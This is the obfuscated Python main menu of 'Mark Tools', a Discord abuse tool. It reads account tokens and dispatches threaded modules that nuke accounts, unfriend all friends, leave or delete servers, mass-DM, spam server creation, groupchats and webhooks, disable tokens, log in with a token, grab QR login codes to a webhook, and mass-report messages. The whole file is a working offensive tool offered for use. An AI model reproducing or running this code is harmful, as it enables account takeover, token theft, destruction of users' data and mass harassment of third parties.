import requests ,threading ,os #line:1
from time import sleep #line:2
from colorama import Fore ,Style ,init #line:3
from util .plugins .common import clear ,setTitle ,getheaders ,THIS_VERSION ,proxy_scrape #line:6
from util .plugins .update import search_for_updates #line:7
import util .accountNuke #line:8
import util .dmdeleter #line:9
import util .info #line:10
import util .login #line:11
import util .groupchat_spammer #line:12
import util .massreport #line:13
import util .QR_Grabber #line:14
import util .seizure #line:15
import util .server_leaver #line:16
import util .spamservers #line:17
import util .statuschanger #line:18
import util .tokendisable #line:19
import util .unfriender #line:20
import util .webhookspammer #line:21
import util .massdm #line:22
init (convert =True )#line:23
def main ():#line:25
    setTitle (f"Mark Tools {THIS_VERSION}")#line:26
    global threads #line:27
    threads =0 #line:28
    clear ()#line:29
    O00000000O0000O0O =Style .BRIGHT +f'''{Fore.LIGHTRED_EX}
                    █▀▄▀█ ▄▀█ █▀█ █▄▀
                    █░▀░█ █▀█ █▀▄ █░█                                    '''.replace ('█',f'{Fore.WHITE}█{Fore.LIGHTRED_EX}')+f'''   
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}
{Fore.RESET}[{Fore.GREEN}1{Fore.RESET}]{Fore.BLACK} Nuke Account                                |{Fore.RESET}[{Fore.GREEN}10{Fore.RESET}]{Fore.BLACK} Disable Account
{Fore.RESET}[{Fore.GREEN}2{Fore.RESET}]{Fore.BLACK} Unfriend all friends                        |{Fore.RESET}[{Fore.GREEN}11{Fore.RESET}]{Fore.BLACK} Status Changer 
{Fore.RESET}[{Fore.GREEN}3{Fore.RESET}]{Fore.BLACK} Delete and leave all servers                |{Fore.RESET}[{Fore.GREEN}12{Fore.RESET}]{Fore.BLACK} QR Code grabber
{Fore.RESET}[{Fore.GREEN}4{Fore.RESET}]{Fore.BLACK} Spam Create New servers                     |{Fore.RESET}[{Fore.GREEN}13{Fore.RESET}]{Fore.BLACK} Mass Report
{Fore.RESET}[{Fore.GREEN}5{Fore.RESET}]{Fore.BLACK} Dm Deleter                                  |{Fore.RESET}[{Fore.GREEN}14{Fore.RESET}]{Fore.BLACK} GroupChat Spammer
{Fore.RESET}[{Fore.GREEN}6{Fore.RESET}]{Fore.BLACK} Mass Dm                                     |{Fore.RESET}[{Fore.GREEN}15{Fore.RESET}]{Fore.BLACK} Webhook Destroyer
{Fore.RESET}[{Fore.GREEN}7{Fore.RESET}]{Fore.BLACK} Enable Fuck Acc Mode                        |{Fore.RESET}[{Fore.GREEN}16{Fore.RESET}]{Fore.RED} Exit
{Fore.RESET}[{Fore.GREEN}8{Fore.RESET}]{Fore.BLACK} Get information from a targetted account    
{Fore.RESET}[{Fore.GREEN}9{Fore.RESET}]{Fore.BLACK} Log into an account                        
{Fore.WHITE}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Style.RESET_ALL}'''#line:44
    print (O00000000O0000O0O )#line:45
    OO0O0O000O0O0O0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Choice: {Fore.LIGHTRED_EX}'))#line:47
    if OO0O0O000O0O0O0OO =='1':#line:49
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:51
        OOOO000O0O0O0O0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))#line:53
        OO00OOOO000OOO00O =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))#line:55
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:58
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:59
            clear ()#line:60
            threads =100 #line:61
            if threading .active_count ()<threads :#line:62
                threading .Thread (target =util .accountNuke .Mark_Nuke ,args =(OOO00OO000OO0O0O0 ,OOOO000O0O0O0O0OO ,OO00OOOO000OOO00O )).start ()#line:63
                return #line:64
        else :#line:65
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:66
            sleep (1 )#line:67
            main ()#line:68
    elif OO0O0O000O0O0O0OO =='2':#line:71
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:73
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:76
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:77
            clear ()#line:78
            threads =100 #line:79
            if threading .active_count ()<threads :#line:80
                threading .Thread (target =util .unfriender .UnFriender ,args =(OOO00OO000OO0O0O0 ,)).start ()#line:81
                return #line:82
        else :#line:83
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:84
            sleep (1 )#line:85
            main ()#line:86
    elif OO0O0O000O0O0O0OO =='3':#line:89
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:91
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:94
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:95
            clear ()#line:96
            threads =100 #line:97
            if threading .active_count ()<threads :#line:98
                threading .Thread (target =util .server_leaver .Leaver ,args =(OOO00OO000OO0O0O0 ,)).start ()#line:99
                return #line:100
        else :#line:101
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:102
            sleep (1 )#line:103
            main ()#line:104
    elif OO0O0O000O0O0O0OO =='4':#line:107
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:109
        OOOO000O0O0O0O0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.LIGHTRED_EX}'))#line:111
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:114
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:115
            clear ()#line:116
            threads =100 #line:117
            if threading .active_count ()<threads :#line:118
                threading .Thread (target =util .spamservers .SpamServers ,args =(OOO00OO000OO0O0O0 ,OOOO000O0O0O0O0OO )).start ()#line:119
                return #line:120
        else :#line:121
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:122
            sleep (1 )#line:123
            main ()#line:124
    elif OO0O0O000O0O0O0OO =='5':#line:127
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:129
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:132
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:133
            clear ()#line:134
            threads =100 #line:135
            if threading .active_count ()<threads :#line:136
                threading .Thread (target =util .dmdeleter .DmDeleter ,args =(OOO00OO000OO0O0O0 ,)).start ()#line:137
                return #line:138
        else :#line:139
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:140
            sleep (1 )#line:141
            main ()#line:142
    elif OO0O0O000O0O0O0OO =='6':#line:145
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:147
        OO000OO000000O000 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.LIGHTRED_EX}'))#line:149
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:152
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:153
            clear ()#line:154
            threads =100 #line:155
            if threading .active_count ()<threads :#line:156
                threading .Thread (target =util .massdm .MassDM ,args =(OOO00OO000OO0O0O0 ,OO000OO000000O000 )).start ()#line:157
                return #line:158
        else :#line:159
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:160
            sleep (1 )#line:161
            main ()#line:162
    elif OO0O0O000O0O0O0OO =='7':#line:165
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:167
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:170
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:171
            clear ()#line:172
            threads =100 #line:173
            if threading .active_count ()<threads :#line:174
                threading .Thread (target =util .seizure .StartSeizure ,args =(OOO00OO000OO0O0O0 ,)).start ()#line:175
                return #line:176
        else :#line:177
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:178
            sleep (1 )#line:179
            main ()#line:180
    elif OO0O0O000O0O0O0OO =='8':#line:183
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:185
        util .info .Info (OOO00OO000OO0O0O0 )#line:186
    elif OO0O0O000O0O0O0OO =='9':#line:188
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:190
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:193
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:194
            clear ()#line:195
            threads =100 #line:196
            if threading .active_count ()<threads :#line:197
                threading .Thread (target =util .login .TokenLogin ,args =(OOO00OO000OO0O0O0 ,)).start ()#line:198
                return #line:199
        else :#line:200
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:201
            sleep (1 )#line:202
            main ()#line:203
    elif OO0O0O000O0O0O0OO =='10':#line:206
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:208
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:211
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:212
            clear ()#line:213
            util .tokendisable .TokenDisable (OOO00OO000OO0O0O0 )#line:214
        else :#line:215
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:216
            sleep (1 )#line:217
            main ()#line:218
    elif OO0O0O000O0O0O0OO =='11':#line:221
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:223
        O0OO00O00OOO000O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Custom Status: {Fore.LIGHTRED_EX}'))#line:225
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:228
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:229
            clear ()#line:230
            util .statuschanger .StatusChanger (OOO00OO000OO0O0O0 ,O0OO00O00OOO000O0 )#line:231
        else :#line:232
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:233
            sleep (1 )#line:234
            main ()#line:235
    elif OO0O0O000O0O0O0OO =='12':#line:237
        OO0O0OOOO0OO000OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.LIGHTRED_EX}'))#line:239
        try :#line:241
            O00OO0O0O0OO000OO =requests .get (OO0O0OOOO0OO000OO )#line:243
            if O00OO0O0O0OO000OO .status_code !=200 :#line:244
                print ("\nInvalid Webhook")#line:245
                sleep (1 )#line:246
                main ()#line:247
        except Exception as OOOO000O00OOOO0O0 :#line:248
            print (f"an error occured\nignoring: {OOOO000O00OOOO0O0}")#line:249
            sleep (4 )#line:250
            main ()#line:251
        util .QR_Grabber .QR_Grabber (OO0O0OOOO0OO000OO )#line:252
    elif OO0O0O000O0O0O0OO =='13':#line:255
        print (f"\n{Fore.LIGHTRED_EX}(the token you input is the account that will send the reports){Fore.RESET}")#line:256
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:258
        OO0OOO00OOOO0O000 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Server ID: {Fore.LIGHTRED_EX}'))#line:260
        O000OOO00OO0O0OO0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Channel ID: {Fore.LIGHTRED_EX}'))#line:262
        OOOO0OOOOO0OOO0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message ID: {Fore.LIGHTRED_EX}'))#line:264
        OO0O000OOO0OOO00O =str (input ('\n[1] Illegal content\n' '[2] Harassment\n' '[3] Spam or phishing links\n' '[4] Self-harm\n' '[5] NSFW content\n\n' f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.LIGHTRED_EX}'))#line:272
        if OO0O000OOO0OOO00O .upper ()in ('1','ILLEGAL CONTENT'):#line:273
            OO0O000OOO0OOO00O =0 #line:274
        elif OO0O000OOO0OOO00O .upper ()in ('2','HARASSMENT'):#line:275
            OO0O000OOO0OOO00O =1 #line:276
        elif OO0O000OOO0OOO00O .upper ()in ('3','SPAM OR PHISHING LINKS'):#line:277
            OO0O000OOO0OOO00O =2 #line:278
        elif OO0O000OOO0OOO00O .upper ()in ('4','SELF-HARM'):#line:279
            OO0O000OOO0OOO00O =3 #line:280
        elif OO0O000OOO0OOO00O .upper ()in ('5','NSFW CONTENT'):#line:281
            OO0O000OOO0OOO00O =4 #line:282
        else :#line:283
            print (f"\nInvalid reason")#line:284
            sleep (1 )#line:285
            main ()#line:286
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:288
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:289
            clear ()#line:290
            util .massreport .MassReport (OOO00OO000OO0O0O0 ,OO0OOO00OOOO0O000 ,O000OOO00OO0O0OO0 ,OOOO0OOOOO0OOO0OO ,OO0O000OOO0OOO00O )#line:291
        else :#line:292
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:293
            sleep (1 )#line:294
            main ()#line:295
    elif OO0O0O000O0O0O0OO =="14":#line:298
        OOO00OO000OO0O0O0 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.LIGHTRED_EX}'))#line:300
        O0O0OO0OO00OO0O00 =requests .get ('https://discord.com/api/v9/users/@me',headers =getheaders (OOO00OO000OO0O0O0 ))#line:303
        if O0O0OO0OO00OO0O00 .status_code ==200 :#line:304
            clear ()#line:305
            util .groupchat_spammer .GcSpammer (OOO00OO000OO0O0O0 )#line:306
        else :#line:307
            print (f"\n{Fore.RED}Invalid Token.{Fore.RESET}")#line:308
            sleep (1 )#line:309
            main ()#line:310
    elif OO0O0O000O0O0O0OO =='15':#line:313
        print (f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
                        ''')#line:317
        O0OO000OOOO00000O =int (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Second Choice: {Fore.LIGHTRED_EX}'))#line:319
        if O0OO000OOOO00000O not in [1 ,2 ]:#line:321
            print (f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid Second Choice')#line:322
            sleep (1 )#line:323
            main ()#line:324
        if O0OO000OOOO00000O ==1 :#line:326
            OO0O0OOOO0OO000OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))#line:328
            try :#line:329
                O00OO0O0O0OO000OO =requests .get (OO0O0OOOO0OO000OO )#line:331
                if O00OO0O0O0OO000OO .status_code !=200 :#line:332
                    print ("\nInvalid Webhook")#line:333
                    sleep (1 )#line:334
                    main ()#line:335
            except Exception as OOOO000O00OOOO0O0 :#line:336
                print (f"an error occured\nignoring: {OOOO000O00OOOO0O0}")#line:337
                sleep (4 )#line:338
                main ()#line:339
            try :#line:341
                requests .delete (OO0O0OOOO0OO000OO )#line:342
                print (f'\n{Fore.GREEN}Webhook Successfully Deleted!{Fore.RESET}\n')#line:343
            except Exception as OOOO000O00OOOO0O0 :#line:344
                print (f'{Fore.RED}Error: {Fore.WHITE}{OOOO000O00OOOO0O0} {Fore.RED}happened while trying to delete the Webhook')#line:345
            OO0O0O000O0O0O0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.LIGHTRED_EX}'))#line:347
            main ()#line:348
        if O0OO000OOOO00000O ==2 :#line:350
            OO0O0OOOO0OO000OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.LIGHTRED_EX}'))#line:352
            OO000OO000000O000 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.LIGHTRED_EX}'))#line:354
            OO00OO0O0000O0000 =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Amount of time for the spam (sec): {Fore.LIGHTRED_EX}'))#line:356
            try :#line:357
                O00OO0O0O0OO000OO =requests .get (OO0O0OOOO0OO000OO )#line:359
                if O00OO0O0O0OO000OO .status_code !=200 :#line:360
                    print ("\nInvalid Webhook")#line:361
                    sleep (1 )#line:362
                    main ()#line:363
            except Exception as OOOO000O00OOOO0O0 :#line:364
                print (f"an error occured\nignoring: {OOOO000O00OOOO0O0}")#line:365
                sleep (4 )#line:366
                main ()#line:367
            util .webhookspammer .WebhookSpammer (OO0O0OOOO0OO000OO ,OO000OO000000O000 ,OO00OO0O0000O0000 )#line:368
    elif OO0O0O000O0O0O0OO =='16':#line:371
        setTitle ("Exiting...")#line:372
        OO0O0O000O0O0O0OO =str (input (f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Are you sure you want to exit? (Y to confirm): {Fore.LIGHTRED_EX}'))#line:374
        if OO0O0O000O0O0O0OO .upper ()=='Y':#line:375
            clear ()#line:376
            Style .RESET_ALL #line:377
            Fore .RESET #line:378
            exit ()#line:379
        else :#line:380
            main ()#line:381
    else :#line:382
        clear ()#line:383
        main ()#line:384
if __name__ =="__main__":#line:386
    search_for_updates ()#line:387
    with open (os .getenv ("temp")+"\\proxies.txt",'w'):pass #line:388
    clear ()#line:389
    proxy_scrape ()#line:390
    sleep (1 )#line:391
    main ()
